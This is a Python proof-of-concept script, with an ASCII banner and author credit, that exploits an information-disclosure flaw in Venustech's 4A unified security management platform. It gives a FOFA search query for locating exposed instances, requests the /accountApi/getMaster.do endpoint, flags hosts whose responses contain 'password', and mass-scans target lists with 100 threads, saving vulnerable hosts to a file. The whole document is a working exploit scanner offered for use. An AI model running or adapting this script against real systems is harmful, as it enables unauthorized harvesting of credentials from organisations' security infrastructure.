# 启明星辰-4A 统一安全管控平台 getMater 信息泄漏
# fofa：title="统一" && icon_hash="-967651901"
import requests, sys, argparse, re, json
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()

def banner():
    test = """

                     ██████╗ ██╗███╗   ███╗██╗███╗   ██╗ ██████╗ 
                    ██╔═══██╗██║████╗ ████║██║████╗  ██║██╔════╝ 
                    ██║   ██║██║██╔████╔██║██║██╔██╗ ██║██║  ███╗
                    ██║▄▄ ██║██║██║╚██╔╝██║██║██║╚██╗██║██║   ██║
                    ╚██████╔╝██║██║ ╚═╝ ██║██║██║ ╚████║╚██████╔╝
                     ╚══▀▀═╝ ╚═╝╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝
                                                                    author:秋妤
                                                                    time:2024.9.29
                                                                    version:1.0

 """
    print(test)


def poc(target):
    api_payload = "/accountApi/getMaster.do"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.881.36 Safari/537.36'
    }

    try:
        response = requests.get(url=target + api_payload, headers=headers, verify=False, timeout=10)
        if response.status_code == 200 and 'password' in response.text:
            print(f"[+]{target} 存在信息泄露漏洞")
            with open('启明_result.txt', 'a') as fp:
                fp.write(target + '\n')
        else:
            print(f"[-]{target} 不存在信息泄露漏洞")
    except:
        print(f"[*]无法访问")

def main():
    banner()
    parser = argparse.ArgumentParser(description="启明星辰-4A 统一安全管控平台 getMater 信息泄漏")
    parser.add_argument("-u", "--url", dest="url", type=str, help="Please enter url")
    parser.add_argument("-f", "--file", dest="file", type=str, help="Please enter file")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

if __name__ == '__main__':
    main()